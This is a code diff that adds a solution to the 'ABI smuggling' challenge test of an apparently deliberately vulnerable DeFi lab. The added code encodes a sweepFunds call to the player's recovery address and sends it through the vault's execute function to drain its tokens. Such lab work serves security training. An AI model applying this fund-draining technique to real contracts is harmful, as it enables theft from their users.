@@ -45,6 +45,13 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Encode sweetFunds data with recovery address
+        let ABI = ["function sweepFunds(address receiver, address token)"];
+        let iface = new ethers.utils.Interface(ABI);
+        const sweepFundsData = iface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);
+
+        await vault.execute(vault.address, sweepFundsData)
     });
 
     after(async function () {
